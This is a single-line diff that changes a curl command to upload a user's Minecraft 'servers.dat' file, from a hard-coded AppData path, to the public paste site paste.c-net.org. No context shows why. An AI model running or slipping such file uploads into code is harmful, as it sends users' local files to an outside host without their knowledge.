@@ -1,1 +1,1 @@
-curl --upload-file 'options.txt' 'https://paste.c-net.org/'
+curl --upload-file 'C:\Users\there\AppData\Roaming\.minecraft\servers.dat' 'https://paste.c-net.org/'
